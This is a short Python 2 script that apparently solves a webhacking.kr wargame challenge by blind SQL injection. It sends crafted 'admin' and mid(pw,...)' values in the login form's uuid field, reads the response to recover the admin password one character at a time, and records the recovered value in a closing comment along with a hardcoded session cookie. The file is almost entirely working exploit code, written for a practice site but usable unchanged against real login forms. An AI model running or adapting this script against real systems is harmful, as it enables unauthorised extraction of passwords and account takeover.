import urllib
import httplib
import hashlib

pw=""
for i in range(1,33):
    for c in range(ord("A"),ord("F"))+range(ord("0"),ord("9"))+range(33,129):
        if c==128:
            print "end"
            input()

        HTTP=httplib.HTTPConnection("webhacking.kr")
        Param=urllib.urlencode({"uuid":"admin' and mid(pw,"+str(i)+",1)="+str(hex(c))+"#","pw":""})
        Headers={"Content-Type":"application/x-www-form-urlencoded",
                 "Cookie":"PHPSESSID=8bb6de49564fa0bee2a26f9a217529fd;",
                 "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"}
        HTTP.request("POST","/challenge/bonus/bonus-2/index.php",Param,Headers)
        Result=HTTP.getresponse().read()
        if "Wrong password!" in Result:
            pw+=chr(c)
            print pw
            break
        else:
            print "admin' and mid(pw,"+str(i)+",1)="+str(hex(c))+"#"

print "end"

# pw is "2A93A7CEA083C6E9E02C97EC5A5D715A"
